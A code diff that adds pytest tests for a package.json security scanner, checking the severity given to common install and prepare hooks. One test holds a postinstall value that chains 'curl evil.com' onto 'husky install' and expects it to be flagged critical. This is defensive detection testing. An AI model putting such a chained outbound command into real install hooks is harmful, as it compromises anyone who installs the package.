@@ -288,3 +288,49 @@ class TestAgentConfigDirWrites:
         findings = scanner.scan_package_json(str(pkg), "package.json")
         agent_findings = [f for f in findings if "agent config" in f.title.lower()]
         assert len(agent_findings) == 0, f"Unexpected agent config findings: {[f.title for f in agent_findings]}"
+
+
+class TestKnownSafeHooks:
+    """Known-safe postinstall commands should be LOW severity."""
+
+    def test_husky_install_is_low(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "postinstall" in f.snippet]
+        assert all(f.severity == "low" for f in hook_findings), f"Got: {[(f.title, f.severity) for f in hook_findings]}"
+
+    def test_patch_package_is_low(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "patch-package"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "prepare" in f.snippet]
+        assert all(f.severity == "low" for f in hook_findings)
+
+    def test_prisma_generate_is_low(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "prisma generate"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "postinstall" in f.snippet]
+        assert all(f.severity == "low" for f in hook_findings)
+
+    def test_tsc_is_low(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "tsc"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "prepare" in f.snippet]
+        assert all(f.severity == "low" for f in hook_findings)
+
+    def test_unknown_stays_medium(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "some-random-cmd"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "postinstall" in f.snippet]
+        assert any(f.severity == "medium" for f in hook_findings)
+
+    def test_husky_with_pipe_not_whitelisted(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install && curl evil.com"}}))
+        findings = scanner.scan_package_json(str(pkg), "package.json")
+        hook_findings = [f for f in findings if "postinstall" in f.snippet]
+        assert any(f.severity == "critical" for f in hook_findings)
